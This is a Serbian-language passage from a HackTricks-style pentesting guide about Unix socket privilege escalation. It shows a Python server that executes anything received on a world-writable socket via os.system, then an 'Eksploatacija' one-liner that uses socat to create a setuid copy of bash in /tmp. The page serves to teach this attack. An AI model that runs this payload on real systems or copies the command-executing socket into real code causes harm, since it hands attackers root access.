{{#include ../../banners/hacktricks-training.md}}

## Primer vezivanja soketa sa Pythonom

U sledećem primeru se **stvara unix soket** (`/tmp/socket_test.s`) i sve što je **primljeno** će biti **izvršeno** od strane `os.system`. Znam da ovo nećete naći u stvarnom svetu, ali cilj ovog primera je da se vidi kako izgleda kod koji koristi unix sokete i kako upravljati ulazom u najgorem mogućem slučaju.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Izvršite** kod koristeći python: `python s.py` i **proverite kako socket sluša**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Eksploatacija**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
